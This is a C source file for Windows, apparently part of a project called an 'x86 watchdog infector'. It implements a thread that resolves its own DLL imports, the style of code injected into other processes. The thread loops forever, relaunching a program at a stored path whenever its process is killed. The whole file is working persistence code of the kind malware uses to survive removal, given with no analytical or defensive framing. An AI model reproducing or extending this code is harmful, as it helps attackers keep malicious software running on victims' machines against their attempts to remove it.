#include <Windows.h>
#include <winternl.h>

#include "x86-watchdog-infector.h"

DWORD WINAPI
ThreadProc(_In_ LPVOID lpParameter)
{
  struct dll_imports imports;

  if (resolve_dll_imports(&imports) < 0) {
    return -1;
  }

  return monitor_proc_id(&imports, lpParameter);
}

int
monitor_proc_id(struct dll_imports* imports, struct watchdog_info* map)
{
  ULONGLONG tick_proc_id_unchanged = 0;
  ULONGLONG proc_id_cache = 0;
  PROCESS_INFORMATION proc_info;
  STARTUPINFOW start_info;

  do {

    if (_InterlockedCompareExchange(&map->lock, 1, 0) == 0) {

      if (process_exists(imports, map->proc_id) == FALSE) {
        libc_memset(&proc_info, 0, sizeof proc_info);
        libc_memset(&start_info, 0, sizeof start_info);

        start_info.cb = sizeof start_info;

        if (imports->CreateProcessW(map->path,
                                    NULL,
                                    NULL,
                                    NULL,
                                    0,
                                    0,
                                    NULL,
                                    NULL,
                                    &start_info,
                                    &proc_info)) {
          map->proc_id = (ULONGLONG)proc_info.dwProcessId;

          imports->CloseHandle(proc_info.hProcess);
          imports->CloseHandle(proc_info.hThread);
        }
      }

      map->lock = 0;
    } else {
      if (proc_id_cache == map->proc_id &&
          process_exists(imports, map->proc_id) == FALSE) {
        ++tick_proc_id_unchanged;
      } else {
        proc_id_cache = map->proc_id;
      }

      if (tick_proc_id_unchanged > 100) {
        map->lock = 0;
      }
    }

    imports->Sleep(1000);
  } while (1);

  return 0;
}
